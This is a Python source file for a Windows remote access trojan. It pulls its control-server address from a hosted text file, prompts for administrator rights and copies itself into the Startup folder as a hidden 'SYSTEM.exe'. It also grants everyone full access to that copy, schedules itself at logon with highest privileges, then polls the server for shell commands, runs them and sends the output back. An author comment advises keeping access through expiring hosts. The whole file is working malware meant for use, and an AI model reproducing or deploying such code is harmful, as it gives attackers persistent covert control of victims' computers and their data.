import requests
import os
import subprocess
import time
import socket
import shutil
import sys
import ctypes
import urllib.request

CROPE = "http://example.com/url.txt" # PUT A TEXT FILE IN THIS SERVER WITH THE LINK TO YOUR MAIN SERVER (BEST IF YOU ARE USING TEMPORARY SERICES LIKE GITPOD WHICH CAN EXPIRE BUT YOU WANT TO KEEP ACCESS)

def get_target_url():
    try:
        with urllib.request.urlopen(CROPE) as response:
            return response.read().decode("utf-8").strip()
    except Exception as e:
        return None
        
SERVER_URL = get_target_url()
CLIENT_ID = f"{socket.gethostbyname(socket.gethostname())}-{os.getlogin()}"
APPDATA = os.getenv("APPDATA")
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
SCRIPT_NAME = "SYSTEM.exe"
SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)
TASK_NAME = "SYSTEM"
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def request_admin():
    try:
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass 
def persist():
    try:
        if sys.argv[0] != SCRIPT_PATH:
            shutil.copy(sys.argv[0], SCRIPT_PATH)
            subprocess.run(f'attrib +h +s +r {SCRIPT_PATH}')
            subprocess.Popen([SCRIPT_PATH], shell=True)
            sys.exit()
        if is_admin():
            subprocess.run(f'icacls "{SCRIPT_PATH}" /grant Everyone:F /T /C /Q', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(f'schtasks /create /tn "{TASK_NAME}" /tr "{SCRIPT_PATH}" /sc onlogon /rl highest /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
def register_client():
    try:
        requests.post(f"{SERVER_URL}/register", json={"client_id": CLIENT_ID}, timeout=5)
    except:
        pass
def fetch_command():
    try:
        response = requests.get(f"{SERVER_URL}/client_data/{CLIENT_ID}/cmd.json", timeout=5)
        if response.status_code == 200:
            return response.json().get("command")
    except:
        pass
    return None
def execute_command(command):
    try:
        if command.lower().startswith(("start ", "explorer", "notepad", "calc")):
            subprocess.Popen(command, shell=True)
            return "Executed: " + command
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except:
        return "Error executing command."
def send_output(output):
    try:
        requests.post(f"{SERVER_URL}/receive_output/{CLIENT_ID}", json={"output": output}, timeout=5)
    except:
        pass
def main():
    persist()
    register_client()
    while True:
        command = fetch_command()
        if command:
            output = execute_command(command)
            send_output(output)
        time.sleep(5)
if __name__ == "__main__":
    try:
        request_admin()
        persist()
    except:
        pass

    main()
